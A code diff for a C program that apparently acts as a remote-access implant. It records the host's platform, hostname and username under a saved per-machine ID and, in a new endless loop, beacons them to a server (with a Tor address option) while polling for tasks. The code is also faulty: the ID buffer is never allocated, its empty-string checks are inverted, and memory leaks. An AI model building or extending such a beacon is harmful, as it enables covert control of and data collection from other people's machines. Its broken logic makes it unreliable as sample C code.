@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdbool.h>
 #include <time.h>
 #include <curl/curl.h>
 #include <unistd.h>
@@ -19,6 +20,11 @@ char *HOSTNAME;
 char *USERNAME;
 const char *URL;
 const char *URL_TOR;
+int UPDATE_FAILED;
+bool IDLE;
+int IDLE_TIME;
+int INTERVAL;
+long TIME_LAST_ACTIVE;
 
 size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     size_t index = data->size;
@@ -27,10 +33,13 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     data->size += (size * nmemb);
     fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
     tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
-    if(tmp) {
+    if(tmp){
         data->data = tmp;
-    } else {
-        if(data->data) {
+    }
+    else
+    {
+        if(data->data)
+        {
             free(data->data);
         }
         fprintf(stderr, "Failed to allocate memory.\n");
@@ -41,41 +50,40 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     return size * nmemb;
 }
 
-char* getUniqueID()
+char* get_unique_id()
 {
-    char *data = malloc(BUFFER_SIZE);
+    if(!(UID!= NULL && UID[0] == '\0')) return UID;
     FILE *f;
     f = fopen(SAVE_FILE,"a+");
     if(f != NULL) fseek(f, 0, SEEK_END);
-    if(!(UID!= NULL && UID[0] == '\0')) return UID;
     if(ftell(f) == 0)
     {
         fclose(f);
         srand(time(0));
         int random = rand();
         f = fopen(SAVE_FILE,"w");
-        fprintf(f,"%s_%d\n",USERNAME,random);
-        sprintf(data,"%s_%d",USERNAME,random);
+        sprintf(UID,"%s_%d",USERNAME,random);
+        fprintf(f,"%s",UID);
         fclose(f);
-        strcpy(UID,data);
-        return data;
-    } else {
+        return UID;
+    }
+    else
+    {
         fclose(f);
         f = fopen(SAVE_FILE,"r");
-        fscanf(f,"%s",data);
+        fscanf(f,"%s",UID);
         fclose(f);
-        strcpy(UID,data);
-        return data;
+        return UID;
     }
 }
 
-char* getRequest(char *path)
+char* get_request(char *path)
 {
     CURL *curl;
     CURLcode res;
     struct url_data data;
     data.size = 0;
-    data.data = malloc(4096);
+    data.data = malloc(BUFFER_SIZE);
     if(data.data == NULL) {
         fprintf(stderr, "Failed to allocate memory.\n");
         return NULL;
@@ -98,13 +106,13 @@ char* getRequest(char *path)
     return data.data;
 }
 
-char* postRequest(char *path, char *post_data)
+char* post_request(char *path, char *post_data)
 {
     CURL *curl;
     CURLcode res;
     struct url_data data;
     data.size = 0;
-    data.data = malloc(4096);
+    data.data = malloc(BUFFER_SIZE);
     if(data.data == NULL) {
         fprintf(stderr, "Failed to allocate memory.\n");
         return NULL;
@@ -114,7 +122,6 @@ char* postRequest(char *path, char *post_data)
       char url[BUFFER_SIZE];
       strcpy(url, URL);
       strcat(url, path);
-      printf("%s",post_data);
       struct curl_slist *headers = NULL;
       headers = curl_slist_append(headers, "Accept: application/json");
       headers = curl_slist_append(headers, "Content-Type: application/json");
@@ -134,19 +141,24 @@ char* postRequest(char *path, char *post_data)
     return data.data;
 }
 
-char* sayhello()
+char* say_hello()
 {
-    char *data = malloc(BUFFER_SIZE);
     char *path = malloc(BUFFER_SIZE);
     char *post_data = malloc(BUFFER_SIZE);
-    sprintf(path, "/api/%s/hello", getUniqueID());
+    sprintf(path, "/api/%s/hello", get_unique_id());
     sprintf(post_data,
             "{\"platform\": \"%s\",\
              \"hostname\": \"%s\",\
              \"username\": \"%s\"}",
             PLATFORM,HOSTNAME,USERNAME);
-    data = postRequest(path, post_data);
-    return data;
+    return post_request(path, post_data);
+}
+
+long get_time()
+{
+    time_t current_time;
+    time(&current_time);
+    return current_time;
 }
 
 void setup()
@@ -155,6 +167,11 @@ void setup()
     PLATFORM = malloc(BUFFER_SIZE);
     HOSTNAME = malloc(BUFFER_SIZE);
     USERNAME = malloc(BUFFER_SIZE);
+    UPDATE_FAILED = 0;
+    IDLE = true;
+    IDLE_TIME = 60;
+    INTERVAL = 3;
+    TIME_LAST_ACTIVE = get_time();
     URL = getenv("URL");
     URL_TOR = getenv("URL_TOR");
     #if __APPLE__
@@ -170,10 +187,29 @@ void setup()
     getlogin_r(USERNAME, BUFFER_SIZE);
 }
 
+void run()
+{
+    char *todo = malloc(BUFFER_SIZE);
+    while(1){
+        todo = say_hello(); //TODO: handle error
+        UPDATE_FAILED = 0;
+        if(!(todo!= NULL && todo[0] == '\0') && strcmp(todo, UID) != 0)
+        {
+            IDLE = false;
+            TIME_LAST_ACTIVE = get_time();
+        }
+        else
+        {
+            if(IDLE) sleep(INTERVAL);
+            else if (get_time() - TIME_LAST_ACTIVE > IDLE_TIME) IDLE = true;
+            else sleep(1);
+        }
+    }
+}
+
 int main()
 {
     setup();
-    char *data = malloc(BUFFER_SIZE);
-    data = sayhello();
-    printf("%s", data);
+    run();
+    return 0;
 }
